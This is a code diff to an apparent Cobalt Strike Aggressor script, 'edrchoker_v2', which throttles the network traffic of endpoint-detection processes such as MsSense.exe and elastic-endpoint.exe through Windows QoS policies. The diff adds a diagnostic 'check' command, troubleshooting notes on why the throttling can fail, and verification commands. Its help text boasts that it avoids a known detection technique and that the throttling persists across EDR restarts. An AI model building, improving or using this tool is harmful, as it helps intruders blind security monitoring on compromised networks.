@@ -5,6 +5,7 @@
 #   edrchoker_v2 remove     "proc1.exe;proc2.exe"   restore specific processes
 #   edrchoker_v2 remove_all                         restore all QoS policies
 #   edrchoker_v2 list                               show active policies
+#   edrchoker_v2 check                              diagnose: service states + active policies
 #
 # vs v1: WMI subscription watchdog removed.
 # QoS policy matches by process name (AppPathNameMatchCondition), not PID —
@@ -16,7 +17,7 @@ alias edrchoker_v2 {
     $cmd = $2;
 
     if ($cmd is $null || $cmd eq "") {
-        berror($bid, "[edrchoker_v2] usage: edrchoker_v2 <add|remove|remove_all|list> [procs]");
+        berror($bid, "[edrchoker_v2] usage: edrchoker_v2 <add|remove|remove_all|list|check> [procs]");
         return;
     }
 
@@ -54,7 +55,13 @@ beacon_command_register(
     "  edrchoker_v2 add        \"p1.exe;p2.exe\"   throttle processes\n" .
     "  edrchoker_v2 remove     \"p1.exe;p2.exe\"   restore network for specific processes\n" .
     "  edrchoker_v2 remove_all                   restore ALL QoS policies\n" .
-    "  edrchoker_v2 list                         show active policies\n\n" .
+    "  edrchoker_v2 list                         show active policies\n" .
+    "  edrchoker_v2 check                        diagnose: Psched/NetQosSvc state + list\n\n" .
+    "Failure causes (run 'check' to diagnose):\n" .
+    "  - Psched not Running  -> policy writes to WMI but pacer.sys does not enforce\n" .
+    "  - NetQosSvc not Running -> PutInstance fails (active=fail)\n" .
+    "  - Non-elevated token  -> WMI returns WBEM_E_ACCESS_DENIED\n" .
+    "  - Win 7 / Server 2008 -> MSFT_NetQosPolicySettingData not in ROOT\\StandardCimv2\n\n" .
     "vs v1:\n" .
     "  No WMI subscription — eliminates T1546.003 detection vector.\n" .
     "  QoS policy persists by name-match: EDR restarts still throttled.\n\n" .
@@ -62,7 +69,9 @@ beacon_command_register(
     "  edrchoker_v2 add    \"MsSense.exe;elastic-endpoint.exe\"\n" .
     "  edrchoker_v2 remove \"MsSense.exe\"\n" .
     "  edrchoker_v2 remove_all\n" .
-    "  edrchoker_v2 list\n\n" .
-    "Verify:\n" .
-    "  Get-WmiObject -Ns ROOT\\StandardCimv2 -Class MSFT_NetQosPolicySettingData"
+    "  edrchoker_v2 list\n" .
+    "  edrchoker_v2 check\n\n" .
+    "Manual verify:\n" .
+    "  shell sc query Psched\n" .
+    "  shell powershell -c \"Get-NetQosPolicy | Where ThrottleRateAction -eq 8\""
 );
